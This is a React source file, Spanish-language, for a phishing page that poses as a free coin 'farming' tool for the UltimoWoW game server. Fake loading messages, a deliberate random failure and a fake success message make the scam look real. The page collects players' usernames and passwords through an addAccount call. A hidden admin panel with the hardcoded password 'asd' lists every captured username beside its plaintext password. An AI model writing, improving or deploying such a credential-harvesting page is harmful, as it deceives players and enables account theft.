import React, { useState, useEffect } from "react";
import {
  FaKey,
  FaCoins,
  FaRedo,
  FaExclamationTriangle,
  FaUser,
  FaLock,
  FaMoneyBillWave,
} from "react-icons/fa";
import { motion, AnimatePresence } from "framer-motion";
import { addAccount } from "./lib/addAccount";
import { getAccounts } from "./lib/getAccounts";

const App: React.FC = () => {
  // Estados para el flujo principal
  const [step, setStep] = useState<number>(0);
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [coinAmount, setCoinAmount] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [loaderMessage, setLoaderMessage] = useState<string>("");
  const [success, setSuccess] = useState<boolean>(false);
  const [error, setError] = useState<boolean>(false);
  const [randomMinutes, setRandomMinutes] = useState<number>(0);
  const [showCredentialWarning, setShowCredentialWarning] =
    useState<boolean>(false);
  const [progress, setProgress] = useState<number>(0);

  // Estados para el panel de administrador
  const [showAdminModal, setShowAdminModal] = useState<boolean>(false);
  const [adminPassword, setAdminPassword] = useState<string>("");
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [passwordError, setPasswordError] = useState<boolean>(false);
  const [accounts, setAccounts] = useState<
    Array<{ id: number; username: string; password: string }>
  >([]);

  // Mensajes para el loader secuencial
  const loaderMessages = [
    "Cargando generador...",
    "Procesando tu IP...",
    "Conectando con ultimowow.com...",
    "Accediendo a la base de datos...",
    "Preparando todo para ti...",
    "Carga completada con éxito!",
  ];

  // Ajustar viewport para dispositivos móviles
  useEffect(() => {
    const setViewportHeight = () => {
      const vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty("--vh", `${vh}px`);
    };

    setViewportHeight();
    window.addEventListener("resize", setViewportHeight);

    return () => window.removeEventListener("resize", setViewportHeight);
  }, []);

  // Función para cargar las cuentas cuando se autentica el admin
  useEffect(() => {
    if (isAuthenticated && showAdminModal) {
      loadAccounts();
    }
  }, [isAuthenticated, showAdminModal]);

  const loadAccounts = async () => {
    try {
      const accountsData = await getAccounts();
      setAccounts(accountsData);
    } catch (error) {
      console.error("Error al cargar cuentas:", error);
    }
  };

  const startFarming = () => {
    setIsLoading(true);
    setError(false);
    setProgress(0);
    setLoaderMessage(loaderMessages[0]);
    let currentMessage = 0;

    const interval = setInterval(() => {
      currentMessage++;
      const newProgress = (currentMessage / loaderMessages.length) * 100;
      setProgress(newProgress);

      if (currentMessage < loaderMessages.length) {
        setLoaderMessage(loaderMessages[currentMessage]);
      } else {
        clearInterval(interval);
        // 20% de probabilidad de fallo para hacerlo realista
        const isSuccess = Math.random() > 0.2;

        setTimeout(() => {
          setIsLoading(false);
          if (isSuccess) {
            setStep(1); // Mostrar formulario de login
          } else {
            setError(true);
          }
        }, 1000);
      }
    }, 800); // Cambia de mensaje cada 800ms
  };

  const handleLogin = () => {
    // Solo muestra la advertencia, no envía datos todavía
    setShowCredentialWarning(true);
  };

  const confirmLogin = async () => {
    setShowCredentialWarning(false);
    setIsLoading(true);
    setLoaderMessage("Guardando credenciales...");

    try {
      // Envía los datos aquí después de confirmar
      await addAccount(username, password);

      setLoaderMessage("Obteniendo permisos de UltimoWoW...");

      // Simula tiempo de procesamiento
      await new Promise((resolve) => setTimeout(resolve, 1500));

      setIsLoading(false);
      setStep(2); // Mostrar formulario de monedas
    } catch (error) {
      console.error("Error al guardar credenciales:", error);
      setIsLoading(false);
      setError(true);
    }
  };

  const requestCoins = () => {
    setIsLoading(true);
    setLoaderMessage("Procesando solicitud de monedas...");

    setTimeout(() => {
      setIsLoading(false);
      setRandomMinutes(Math.floor(Math.random() * 3) + 3); // 3-5 minutos
      setSuccess(true);
    }, 3000 + Math.random() * 2000); // Entre 3 y 5 segundos
  };

  const resetProcess = () => {
    setStep(0);
    setUsername("");
    setPassword("");
    setCoinAmount("");
    setError(false);
    setSuccess(false);
    setProgress(0);
  };

  // Funciones para el panel de administrador
  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (adminPassword === "asd") {
      setIsAuthenticated(true);
      setPasswordError(false);
    } else {
      setPasswordError(true);
      setAdminPassword("");
    }
  };

  // Animaciones
  const backdrop = {
    hidden: { opacity: 0 },
    visible: { opacity: 1 },
    exit: { opacity: 0 },
  };

  const modal = {
    hidden: { y: -50, opacity: 0 },
    visible: {
      y: 0,
      opacity: 1,
      transition: { type: "spring", damping: 25, stiffness: 500 },
    },
    exit: { y: 50, opacity: 0 },
  };

  return (
    <div className="flex flex-col px-4 sm:px-7 bg-black/50 items-center justify-center text-white relative min-h-dvh">
      {/* Favicon */}
      <link
        rel="icon"
        href="https://ultimowow.com/favicon.ico"
        type="image/x-icon"
      />

      {/* Botón de administrador */}
      <motion.button
        onClick={() => setShowAdminModal(true)}
        className="absolute top-4 right-4 p-2 bg-gray-800 bg-opacity-70 rounded-full hover:bg-gray-700 transition duration-300"
        title="Acceso administrador"
        whileHover={{ scale: 1.1 }}
        whileTap={{ scale: 0.95 }}
      >
        <FaKey className="text-yellow-400 text-xl" />
      </motion.button>

      {/* Logo y Títulos */}
      <div className="flex items-center mb-6 sm:mb-8">
        <img
          src="/logo.png"
          alt="UltimaWoW Logo"
          className="w-14 h-14 sm:w-16 sm:h-16 mr-3 sm:mr-4"
        />
        <div className="flex flex-col">
          <h1 className="text-3xl sm:text-4xl font-bold text-yellow-400">
            UltimoWoW
          </h1>
          <h2 className="text-sm sm:text-base text-gray-300">
            Farmea monedas con tu IP
          </h2>
        </div>
      </div>

      {/* Contenido principal */}
      <div className="w-full max-w-md bg-gray-800/70 rounded-lg p-5 sm:p-6 border border-gray-600 mx-2">
        {step === 0 && (
          <div className="flex flex-col items-center">
            {!isLoading && !error && (
              <>
                <motion.div
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring", damping: 6 }}
                >
                  <FaCoins className="text-yellow-400 text-5xl sm:text-6xl mb-4 sm:mb-5" />
                </motion.div>
                <h3 className="text-xl sm:text-2xl font-bold text-center mb-5 sm:mb-6">
                  Comenzar farmeo
                </h3>
                <motion.button
                  onClick={startFarming}
                  className="px-6 py-3 sm:px-7 sm:py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold flex items-center text-base sm:text-lg"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Iniciar Proceso
                </motion.button>
              </>
            )}

            {isLoading && (
              <div className="flex flex-col items-center w-full">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  className="rounded-full h-12 w-12 sm:h-14 sm:w-14 border-t-2 border-b-2 border-yellow-500 mb-4"
                ></motion.div>
                <p className="text-center text-gray-300 mb-3 text-sm sm:text-base">
                  {loaderMessage}
                </p>
                <div className="w-full bg-gray-700 rounded-full h-2.5 sm:h-3 mt-3">
                  <motion.div
                    className="bg-yellow-500 h-full rounded-full"
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                    transition={{ duration: 0.8, ease: "easeOut" }}
                  ></motion.div>
                </div>
              </div>
            )}

            {error && (
              <div className="flex flex-col items-center text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  className="text-red-400 text-5xl sm:text-6xl mb-4"
                >
                  ✖
                </motion.div>
                <h3 className="text-lg sm:text-xl font-bold text-red-400 mb-2">
                  Error en la conexión
                </h3>
                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                  El servidor no respondió. Inténtalo de nuevo.
                </p>
                <motion.button
                  onClick={startFarming}
                  className="px-6 py-3 sm:px-7 sm:py-3 bg-red-600 hover:bg-red-500 text-white rounded-md transition font-bold flex items-center text-base sm:text-lg"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  <FaRedo className="mr-2" /> Reintentar
                </motion.button>
              </div>
            )}
          </div>
        )}

        {step === 1 && !isLoading && (
          <form className="flex flex-col space-y-2 sm:space-y-5">
            <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3 flex items-center">
              <FaUser className="mr-2" /> Acceso a UltimoWoW
            </h3>

            <div className="relative">
              <input
                type="text"
                placeholder="Usuario o Correo"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
                required
              />
              <FaUser className="absolute left-3 top-3.5 text-gray-400" />
            </div>

            <div className="relative">
              <input
                type="password"
                placeholder="Contraseña"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
                required
              />
              <FaLock className="absolute left-3 top-3.5 text-gray-400" />
            </div>

            <motion.button
              type="button"
              onClick={handleLogin}
              className="w-full mt-3 px-4 py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              disabled={!username || !password}
            >
              Continuar
            </motion.button>
          </form>
        )}

        {isLoading && step === 1 && (
          <div className="flex flex-col items-center">
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
              className="rounded-full h-12 w-12 sm:h-14 sm:w-14 border-t-2 border-b-2 border-yellow-500 mb-4"
            ></motion.div>
            <p className="text-center text-gray-300 mb-3 text-sm sm:text-base">
              {loaderMessage}
            </p>
          </div>
        )}

        {step === 2 && (
          <form className="flex flex-col space-y-4 sm:space-y-5">
            <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3 flex items-center">
              <FaMoneyBillWave className="mr-2" /> Solicitar monedas
            </h3>

            <div className="relative">
              <input
                max={30000}
                type="number"
                placeholder="(max 30k)"
                value={coinAmount}
                onChange={(e) => setCoinAmount(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
                required
                min="1"
              />
              <FaCoins className="absolute left-3 top-3.5 text-gray-400" />
            </div>

            {isLoading ? (
              <div className="flex flex-col items-center">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  className="rounded-full h-8 w-8 border-t-2 border-b-2 border-yellow-500 mb-2"
                ></motion.div>
                <p className="text-gray-300 text-sm">{loaderMessage}</p>
              </div>
            ) : (
              <motion.button
                type="button"
                onClick={requestCoins}
                className="w-full px-4 py-3 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                disabled={!coinAmount}
              >
                Solicitar
              </motion.button>
            )}
          </form>
        )}
      </div>

      {/* Modal de advertencia de credenciales */}
      <AnimatePresence>
        {showCredentialWarning && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-yellow-400"
            >
              <div className="text-center">
                <motion.div
                  animate={{ scale: [1, 1.1, 1] }}
                  transition={{ duration: 0.5 }}
                >
                  <FaExclamationTriangle className="text-yellow-400 text-5xl sm:text-6xl mx-auto mb-4" />
                </motion.div>
                <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-3">
                  ¡Verifica tus credenciales!
                </h3>
                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                  Por favor asegúrate de que el usuario y contraseña de tu
                  cuenta sean correctos. Un error en estas credenciales podría
                  resultar en la pérdida de las monedas.
                  <br />
                  <strong>Nota:</strong> Las monedas van para todos los
                  personajes de la cuenta.
                </p>
                <div className="flex flex-col sm:flex-row justify-center gap-3">
                  <motion.button
                    onClick={() => setShowCredentialWarning(false)}
                    className="px-5 py-2.5 bg-gray-600 hover:bg-gray-500 text-white rounded-md transition font-bold"
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    Revisar de nuevo
                  </motion.button>
                  <motion.button
                    onClick={confirmLogin}
                    className="px-5 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.95 }}
                  >
                    Sí, son correctas
                  </motion.button>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Modal de éxito */}
      <AnimatePresence>
        {success && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4"
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-green-500"
            >
              <div className="text-center">
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ type: "spring" }}
                  className="text-green-400 text-5xl sm:text-6xl mb-4"
                >
                  ✓
                </motion.div>
                <h3 className="text-xl sm:text-2xl font-bold text-green-400 mb-3">
                  ¡Solicitud completada!
                </h3>
                <p className="text-gray-300 mb-5 sm:mb-6 text-sm sm:text-base">
                  Monedas solicitadas correctamente. Tu pedido aparecerá en el
                  buzón en aproximadamente {randomMinutes} minutos.
                </p>
                <motion.button
                  onClick={resetProcess}
                  className="px-6 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-white rounded-md transition font-bold"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Entendido
                </motion.button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Modal de administrador */}
      <AnimatePresence>
        {showAdminModal && (
          <motion.div
            key="backdrop"
            variants={backdrop}
            initial="hidden"
            animate="visible"
            exit="exit"
            className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4"
          >
            <motion.div
              key="modal"
              variants={modal}
              className="bg-gray-800/95 backdrop-blur-sm rounded-lg p-6 sm:p-7 max-w-md w-full border border-yellow-400 shadow-xl"
            >
              {!isAuthenticated ? (
                <>
                  <h3 className="text-xl sm:text-2xl font-bold text-yellow-400 mb-4 flex items-center">
                    <FaKey className="mr-2" /> Acceso Administrador
                  </h3>
                  <form onSubmit={handleAdminLogin}>
                    <div className="relative mb-4">
                      <input
                        type="password"
                        placeholder="Contraseña de administrador"
                        value={adminPassword}
                        onChange={(e) => setAdminPassword(e.target.value)}
                        className="w-full pl-10 pr-4 py-3 rounded-md bg-gray-700/90 text-white focus:outline-none focus:ring-2 focus:ring-yellow-500 border border-gray-600"
                        required
                      />
                      <FaLock className="absolute left-3 top-3.5 text-gray-400" />
                    </div>
                    {passwordError && (
                      <p className="text-red-400 mb-4 text-sm">
                        Contraseña incorrecta
                      </p>
                    )}
                    <div className="flex justify-end gap-3">
                      <motion.button
                        type="button"
                        onClick={() => {
                          setShowAdminModal(false);
                          setPasswordError(false);
                          setAdminPassword("");
                        }}
                        className="px-4 py-2.5 bg-gray-600/90 hover:bg-gray-500 rounded-md transition"
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                      >
                        Cancelar
                      </motion.button>
                      <motion.button
                        type="submit"
                        className="px-4 py-2.5 bg-yellow-600/90 hover:bg-yellow-500 rounded-md transition font-bold"
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                      >
                        Acceder
                      </motion.button>
                    </div>
                  </form>
                </>
              ) : (
                <>
                  <div className="flex justify-between items-center mb-4">
                    <h3 className="text-xl sm:text-2xl font-bold text-yellow-400">
                      Panel de Administración
                    </h3>
                    <motion.button
                      onClick={() => {
                        setShowAdminModal(false);
                        setIsAuthenticated(false);
                        setAdminPassword("");
                      }}
                      className="p-2 text-gray-400 hover:text-white transition"
                      whileHover={{ scale: 1.2 }}
                      whileTap={{ scale: 0.9 }}
                      title="Cerrar panel"
                    >
                      ✕
                    </motion.button>
                  </div>

                  <div className="bg-gray-700/80 rounded-md overflow-hidden">
                    <h4 className="text-lg font-semibold p-3 border-b border-gray-600">
                      Cuentas registradas
                    </h4>
                    <div className="max-h-60 overflow-y-auto">
                      {accounts.length > 0 ? (
                        <ul className="divide-y divide-gray-600">
                          {accounts.map((account) => (
                            <li
                              key={account.id}
                              className="p-3 hover:bg-gray-600/50 transition"
                            >
                              <div className="flex justify-between items-center">
                                <div>
                                  <p className="font-medium">
                                    {account.username}
                                  </p>
                                  <p className="text-xs text-gray-400">
                                    ID: {account.id}
                                  </p>
                                </div>
                                <span className="text-xs bg-gray-800 px-2 py-1 rounded">
                                  {account.password}
                                </span>
                              </div>
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <p className="p-3 text-gray-400 text-center">
                          No hay cuentas registradas
                        </p>
                      )}
                    </div>
                  </div>
                </>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default App;
